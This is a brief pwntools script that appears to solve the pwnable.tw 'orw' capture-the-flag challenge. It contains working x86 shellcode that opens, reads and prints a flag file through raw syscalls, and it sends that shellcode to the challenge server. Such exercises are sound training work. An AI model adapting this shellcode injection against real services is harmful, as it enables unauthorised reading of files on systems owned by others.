###seccomp sandbox
###read flag with open, read, write

from pwn import *

# //home/orw/flag
# 2f 2f 68 6f 6d 65 2f 6f 72 77 2f 66 6c 61 67 00

a = asm("""
        push 0x0067616C
        push 0x662F7772
        push 0x6F2F656D
        push 0x6F682F2F
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        mov eax, 0x5
        int 0x80

        mov ebx, eax
        mov ecx, esp
        mov edx, 0x100
        mov eax, 0x3
        int 0x80


        mov ebx, 1
        mov ecx, esp
        mov eax, 0x4
        int 0x80
        """)

r = remote('chall.pwnable.tw',10001)
r.sendafter('shellcode:',a)
r.interactive()
